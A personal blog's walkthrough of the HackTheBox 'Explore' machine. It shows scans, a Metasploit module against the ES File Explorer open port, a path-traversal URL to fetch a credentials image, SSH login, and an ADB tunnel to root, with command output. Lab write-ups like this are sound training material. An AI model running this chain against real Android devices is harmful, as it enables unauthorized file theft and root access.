@@ -1,0 +1,298 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Explore HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Explore HackTheBox Walkthrough</h2>
+<p><span>November 2, 2021</span> by <span>Nasef</span></p>
+<img class=feature-image src=https://iamnasef.com/images/blog/019/featured-image.png alt=blog-feature-image>
+<p>Hello everybody !
+I am Nasef and today I am going to show you how I hacked Explore machine from hack the box, so let&rsquo;s get started !</p>
+<h2 id=services-enumeration>Services Enumeration</h2>
+<p>Nmap found port ssh(2222) opened and freeciv (5555) filtered which after researching I found that it belongs to adb not freeciv.</p>
+<pre tabindex=0><code>nmap -sC -sV 10.129.172.173        
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 09:07 EDT
+Nmap scan report for 10.129.172.173
+Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT     STATE    SERVICE VERSION
+2222/tcp open     ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-SSH Server - Banana Studio
+| ssh-hostkey: 
+|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
+5555/tcp filtered freeciv
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2222-TCP:V=7.91%I=7%D=6/27%Time=60D8780A%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services and found two filtered ports, I may look into them.</p>
+<pre tabindex=0><code>nmap -sU 10.129.172.173            
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 09:07 EDT
+Nmap scan report for 10.129.172.173
+Host is up (0.11s latency).
+Not shown: 998 closed ports
+PORT     STATE         SERVICE
+1900/udp open|filtered upnp
+5353/udp open|filtered zeroconf
+
+Nmap done: 1 IP address (1 host up) scanned in 1095.40 seconds
+
+</code></pre><p>I ran another nmap scan -p- for enumerating and found three new ports.</p>
+<pre tabindex=0><code>nmap -p- 10.129.172.173            
+Host is up (0.10s latency).
+Scanned at 2021-06-27 09:07:28 EDT for 900s
+Not shown: 65530 closed ports
+PORT      STATE    SERVICE
+2222/tcp  open     EtherNetIP-1
+5555/tcp  filtered freeciv
+39693/tcp open     unknown
+42135/tcp open     unknown
+59777/tcp open     unknown
+Final times for host: srtt: 104137 rttvar: 914  to: 107793
+
+</code></pre><p>I ran -sC -sV on the new ports. After trial and error, port 59777 got my attention.</p>
+<pre tabindex=0><code>nmap -sC -sV -p 59777 10.129.172.173     
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 09:27 EDT
+Nmap scan report for 10.129.172.173
+Host is up (0.10s latency).
+
+PORT      STATE SERVICE VERSION
+59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
+|_http-title: Site doesn't have a title (text/plain).
+
+</code></pre><p>I ran Nikto Scan and found that I was able to read system files by adding extra / to url, something I will use in exploitation</p>
+<pre tabindex=0><code>nikto -host http://10.129.172.173:59777
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.129.172.173
++ Target Hostname:    10.129.172.173
++ Target Port:        59777
++ Start Time:         2021-06-27 09:11:49 (GMT-4)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ /bin/ss: Mediahouse Statistics Server may allow attackers to execute remote commands. Upgrade to the latest version or remove from the CGI directory.
++ /bin/post-query: Echoes back result of your POST
++ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
++ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
++ Scan terminated:  19 error(s) and 6 item(s) reported on remote host
++ End Time:           2021-06-27 09:27:43 (GMT-4) (954 seconds)
+---------------------------------------------------------------------------
+</code></pre><p>This concludes the service enumeration phase.</p>
+<h2 id=exploitation>Exploitation</h2>
+<p>After searching in google &ldquo;Android 59777 exploit&rdquo;, I found multiple articles about a vulnerability in an application allows file listing</p>
+<pre tabindex=0><code>https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port
+
+</code></pre><p>So I searched for public Exploit and found an MSF Module</p>
+<pre tabindex=0><code>https://www.rapid7.com/db/modules/auxiliary/scanner/http/es_file_explorer_open_port/
+
+</code></pre><p>after ton of trial and error I found an image called cred which stands for credintials!</p>
+<pre tabindex=0><code>msf6 &gt; use auxiliary/scanner/http/es_file_explorer_open_port
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; show options 
+
+Module options (auxiliary/scanner/http/es_file_explorer_open_port):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   ACTIONITEM                   no        If an app or filename if required by the action
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT       59777            yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   THREADS     1                yes       The number of concurrent threads (max one per host)
+   VHOST                        no        HTTP server virtual host
+
+Auxiliary action:
+
+   Name           Description
+   ----           -----------
+   GETDEVICEINFO  Get device info
+
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set RHOSTS 10.129.172.173
+RHOSTS =&gt; 10.129.172.173
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION 
+set ACTION APPLAUNCH       set ACTION LISTAPPS        set ACTION LISTAPPSSDCARD  set ACTION LISTFILES
+set ACTION GETDEVICEINFO   set ACTION LISTAPPSALL     set ACTION LISTAPPSSYSTEM  set ACTION LISTPICS
+set ACTION GETFILE         set ACTION LISTAPPSPHONE   set ACTION LISTAUDIOS      set ACTION LISTVIDEOS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTPICS 
+ACTION =&gt; LISTPICS
+msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; exploit 
+
+[+] 10.129.172.173:59777 
+  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
+  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
+  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
+  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+</code></pre><p>I need to browse this image. Compining my Nikto Scan I was able to list and see this image</p>
+<pre tabindex=0><code>http://10.129.172.27:59777////storage/emulated/0/DCIM/creds.jpg
+</code></pre><p><img src=/images/blog/019/1.png alt=image></p>
+<p>I sshed to the user kirsti and found the user flag in /sdcard/</p>
+<pre tabindex=0><code>ssh kristi@10.129.172.173 -p 2222                                                                      
+The authenticity of host '[10.129.172.173]:2222 ([10.129.172.173]:2222)' can't be established.
+RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.129.172.173]:2222' (RSA) to the list of known hosts.
+Password authentication
+Password:                
+:/ $ cd sdcard
+:/sdcard $ cat user.txt
+f32017174c7c7e8f50c6da52891ae250
+</code></pre><h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>When I get a filtered port, Normally I either try ssh tunneling as the service may accept connections only from localhost. or try port knocking.</p>
+<p>I started by ssh tunneling and I was able to connect with adb then su into root.</p>
+<pre tabindex=0><code>ssh -L 5555:localhost:5555 kristi@10.129.172.173 -p 2222
+adb connect localhost:5555
+connected to localhost:5555
+adb shell                 
+x86_64:/ $ su                                                                                                                                                                                                                    
+:/ # whoami
+root
+:/ # find / -name root.txt 2&gt; /dev/null
+/data/root.txt
+1|:/ # cat /data/root.txt
+f04fc82b6d49b41c9b08982be59338c5
+:/ #                                                                                                                                
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Security Consultancy <br>Security Technical Training<br>Security Awarness Training
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
